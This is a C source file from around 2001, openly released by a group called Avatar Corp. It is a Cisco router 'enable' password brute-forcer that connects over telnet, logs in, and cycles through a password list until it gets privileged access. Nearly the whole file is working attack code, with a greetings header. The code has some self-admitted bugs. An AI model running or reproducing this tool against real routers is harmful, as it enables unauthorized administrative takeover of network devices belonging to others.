/*

             .: free source :. .: coded 4 Avatar Corp :.

        enabler.                      
        cisco internal bruteforcer.                    

                                             coder - norby   
                                           concept - anyone

    
  this program just logs into a CISCO router and tries a list of 
  passes looking for the enable one.
  it works in password-only CISCO as well in login-pass ones and 
  has been succesfully tested on many 2600 and a few 12008.
  the prog's concept [bruteforcing a router for gaining enable access] 
  is quite simple ...how amazing I haven't seen similar progs before!

  anti eleet&0day force ;)
  anyway... information wants to be free :) 

                      sciao belli

               saluti a berserker mandarine, acidcrash
               beho x la traduzione :)                                    

          norby
               saluti a *lei*, saluti a gabriella che a capodanno
               non ha voluto lasciare il ragazzo x fare un bambino con me ;) 
               saluti a tutti gli avatar, a sandman, a tutte le diecimila
               persone che conosco
          any
               saluti a Acida, storm\, Raid

 contact`    norby - staff22@infinito.it      anyone - anyone@anyone.org
                www.avatarcorp.org 


neural collapse _ i truly hope in this project

v1 02/10/2k+1
todo for v2: use of threads, implement a passlist recovery 
            (very simple feature)     
*/



#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <signal.h>

#define BOX                     "\033[0m\033[34;1m[\033[0m\033[37;1m`\033[0m\033[34;1m]"

struct sockaddr_in addr;
char host[100];
struct hostent *hp;
int sock_stat;

int n,x;
char **password;

char resolve(char *inputhost) {

    int a,b,c,d;

    if (sscanf(inputhost,"%d.%d.%d.%d",&a,&b,&c,&d) !=4) {
       hp = gethostbyname(inputhost);
       if (hp == NULL) { printf("%s error on host resolving\n\033[0m\n", BOX); exit(0); }
       sprintf(host,"%d.%d.%d.%d",(unsigned char)hp->h_addr_list[0][0],
                                  (unsigned char)hp->h_addr_list[0][1],
                                  (unsigned char)hp->h_addr_list[0][2],
                                  (unsigned char)hp->h_addr_list[0][3]);
    }
    else { strncpy(host,inputhost,100); }
}
 
int sock(char *hostoresolve,int port) {

    int err;
 
    sock_stat = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sock_stat<0) { printf("%s error opening socket\n\033[0m\n", BOX); exit(0); }

    addr.sin_family = PF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(host);

    err = connect(sock_stat, (struct sockaddr *) &addr, sizeof(addr));
    if (err < 0) { printf("%s error opening connection\n\033[0m\n", BOX); exit(0); }
}

int banner() {
    printf("\n%s enabler.\n", BOX); 
    printf("%s         cisco internal bruteforcer. concept by anyone\n", BOX); 
    printf("%s                                       coded by norby\n", BOX);
}
int usage(char *argv) { printf("%s usage: %s <ip> [-u user] <pass> <passlist> [port]\n\n\033[0m", BOX, argv); }

void sig() { 
     if(n>0) { printf("%s %i passwords tryed. no password matching. leaving\n",BOX,n); }
     printf("\n\033[0m"); exit(0);
}

int login(char *login, char *pass) {

    char *input = malloc(4000);
    int reqlogin;

    while (read (sock_stat, input, 4000) > 0) {      
     if(strstr(input,"ogin:")||strstr(input,"sername:")) { 
        if(!strcmp(login,"n0login")) { 
          printf("%s username needed... give me a username next time :)\n\n\033[0m", BOX); 
          exit(0);
        }
        printf("%s login requested. sending [%s] and [%s]\n", BOX, login, pass); reqlogin=1; break; 
     } 
     if(strstr(input,"assword:")) { printf("%s only password needed. sending [%s]\n", BOX, pass); reqlogin=0; break; } 
     bzero(input,4000);
    }

    if(reqlogin==1) {
      write(sock_stat,login,strlen(login)); 
      write(sock_stat,"\r\n",2);

      while(read(sock_stat,input,4000)>0) {
        if(strstr(input,"assword")); { break; }
      }
    }

    write(sock_stat,pass,strlen(pass)); 
    write(sock_stat,"\r\n",2);

    sleep(2);

    bzero(input,4000);

    while (read (sock_stat, input, 4000) > 0) {
      if(strstr(input,">")) { printf("%s seems we are logged in :)\n", BOX); break; }
  /*    if(strstr(input,"assword:")) {  
        printf("%s sorry... [%s] is not a good password for login :�\n\033[0m\n",BOX,pass); exit(0); 
      }*/ 
      if(strstr(input,"sername:")) {
        printf("%s sorry... [%s] is not a good password for login :�\n\033[0m\n",BOX,pass); exit(0);
      }
      bzero(input,4000);
    }
}

int loadwordlist(char *list) {
 
   FILE   *passlist;
   char   buf[32], fake; 
   int i,z;

   if ((passlist = fopen(list, "r")) == NULL) { 
      printf("%s sorry, unable to open the passlist [%s]\n\033[0m\n", BOX,list); 
      exit(0); 
   }

   (void)fseek(passlist, 0L, SEEK_END);       // cazz questo e' uno smanettamento mentale  
   password = malloc(ftell(passlist));        // per fare allocare solo la memoria giusta x la passlist :P
   if(password == NULL) { 
     printf("%s sorry, can't allocate memory for passlist. buy more ram or cut the passlist\n\033[0m\n",BOX);
     exit(0);
   }  

   (void)fseek(passlist, 0L, SEEK_SET);

   while (!feof(passlist)) {
     fgets(buf, 32, passlist);
     if (buf[0] == '#' || buf[0] == '\n') continue;
     for (i = 0; i < strlen(buf); i++)
         if (buf[i] == '\n') buf[i] = '\0';
     password[x] = malloc(32);
     strcpy(password[x], buf);
     memset(buf, 0, 32);
     x++;
   }
   password[x] = 0x0;
   fclose(passlist);
   if(x<4) { printf("%s sorry, but passlist must contain at least 3 passwords. leaving \n\033[0m\n",BOX); exit(0); }

}

int brute() {  // there is a stupid error... the last password is tryed 2 times... must be fixed... ;)         
   
   char *input = malloc(100);
   int N;

   bzero(input,100);

   write(sock_stat,"enable",6);
   write(sock_stat,"\r\n",2);


   while(1) { 

     while(read(sock_stat,input,100)>0) {
       if(n==x) { printf("%s %i passwords tried. no valid password found in the passlist\n\033[0m\n",BOX,n-1); exit(0); }
       if(n+1==x) break;
       if(strstr(input,"assword:")||strstr(input,"#")||strstr(input,">")) break;
       bzero(input,100);
     }
   
     if(strstr(input,"#")) { printf("%s possible password found: %s\n\033[0m\n",BOX,password[n-1]); exit(0); }

     if(strstr(input,"assword:")) {
       write(sock_stat,password[n],strlen(password[n]));
       write(sock_stat,"\r\n",2);
       n++; 
       bzero(input,100); 
       if(n>1) printf("%s %s... wrong password\n", BOX, password[n-2]); fflush(stdout); 
       continue;
     } 
     if(strstr(input,">")) {
       write(sock_stat,"enable\r\n",8); bzero(input,100); 
     }
   }
}

int main(int argc, char *argv[]) {

    int port; 
     
    signal(SIGINT, sig);

    banner(); 
    if((argc<=3)||(argc>=8)) { usage(argv[0]); exit(0); }

    if(!strcmp(argv[2],"-u")) {
      if(argc==6) { port=atoi("23"); }
      else { port=atoi(argv[6]); } // c'e' uno stupido errore qua di argc che nn ho voglia di trovare
                                   // c'ho cosetta nella testa :� -- Corretto :) 

      printf("%s\n",BOX);

      loadwordlist(argv[5]);
      resolve(argv[1]);
      sock(host, port);
      login(argv[3],argv[4]);
      brute();
    }

    else {
      if(argc==4) { port=atoi("23"); }
      else { port=atoi(argv[4]); }
      printf("%s\n",BOX);

      loadwordlist(argv[3]);
      resolve(argv[1]);
      sock(host, port);
      login("n0login",argv[2]);
      brute();
    }
} 

